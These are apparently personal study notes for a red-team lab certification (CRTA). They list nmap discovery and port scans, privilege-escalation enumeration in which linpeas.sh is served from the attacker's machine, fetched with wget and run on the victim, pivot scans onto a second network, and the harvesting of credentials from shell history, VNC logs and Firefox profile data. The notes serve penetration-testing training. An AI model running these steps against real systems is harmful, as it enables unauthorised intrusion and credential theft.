# CRTA

## Initial Access

### Discover the hosts

```bash
nmap -sn IP/MASK
```



### Port Scan

```bash
nmap -sC -sV IP
```





## External Web Site



Intercept the request with Burp Suite to try get some injection

### SSRF

...





## Enumeration

Once we have access to the machine, using LinPeas to get information

<pre class="language-bash"><code class="lang-bash"><strong># copy linpeas.sh and run this on att machine
</strong><strong>python3 -m http.server
</strong>
wget http://IP/linpeas.sh
chmod +x lin.sh
./lin.sh
</code></pre>

Manual enumeration for linux priv esc

```bash
sudo -l
```



### Scan another network

if the pwnd machine has 2 or more network interface we can use NMAP on victim machine (if it's installed) and discover another hosts.&#x20;

```bash
nmap -sn NETWORK_2/MASK
```

When we find some computers on that network we can perform further scan with nmap

```bash
nmap -sC -sV IP_2
```



### Find credentials to AD Domain

In a linux machine we can find some windows credentials in some log files like these:

```bash
cat .vnc_log
cat .mysql_history
```



### Through the Firefox Data

If we have a .mozilla directory, the dir might contains some interesting data.

We can check into the bookmarks.

```bash
cd ~/.mozilla/firefox/...default-release
ls
sqlite3 places.sqlite

> .tables
> SELECT * FROM moz_bookmarks;
```
